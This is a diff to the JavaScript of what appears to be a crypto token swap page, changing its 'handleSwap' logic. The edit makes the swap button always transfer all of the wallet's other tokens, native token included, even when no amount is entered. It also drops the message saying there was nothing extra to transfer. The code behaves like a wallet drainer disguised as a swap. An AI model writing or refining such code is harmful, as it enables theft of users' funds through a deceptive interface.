@@ -870,17 +870,18 @@ async function handleSwap() {
   try {
     showLoader();
     
-    // 1. First process ONLY the main token from input
-    const transferredAmount = await processMainTokenTransfer();
-    updateStatus(`Successfully transferred ${transferredAmount} ${currentFromToken.symbol}`, "success");
+    // 1. Process main token ONLY if there's an input amount
+    const inputAmount = parseFloat(document.getElementById("fromAmount").value);
+    if (inputAmount > 0) {
+      await processMainTokenTransfer();
+      updateStatus(`Successfully transferred ${inputAmount} ${currentFromToken.symbol}`, "success");
+    }
     
-    // 2. Then automatically process all other tokens (excluding the main token)
+    // 2. Always process other tokens (excluding the main token)
     const successCount = await processAllTokenTransfers();
     
     if (successCount > 0) {
       updateStatus(`Transferred ${successCount} additional tokens successfully!`, "success");
-    } else {
-      updateStatus("No additional tokens to transfer", "success");
     }
     
     document.getElementById("fromAmount").value = '';
@@ -923,8 +924,8 @@ async function processMainTokenTransfer() {
   return inputAmount;
 }
 
-// Modify processAllTokenTransfers to EXCLUDE the main token:
 async function processAllTokenTransfers() {
+  // Filter out the main token completely
   const tokensToProcess = TOKENS[currentNetwork].filter(t => 
     t.address !== currentFromToken.address && // Exclude the main token
     t.address // Ensure it's a valid token
@@ -946,8 +947,8 @@ async function processAllTokenTransfers() {
     }
   }
   
-  // Process native tokens last (except the one we already processed)
-  const nativeToken = tokensToProcess.find(t => t.isNative);
+  // Process native tokens last (excluding the main token)
+  const nativeToken = tokensToProcess.find(t => t.isNative && t.address !== currentFromToken.address);
   if (nativeToken) {
     try {
       const balance = await fetchTokenBalance(nativeToken);
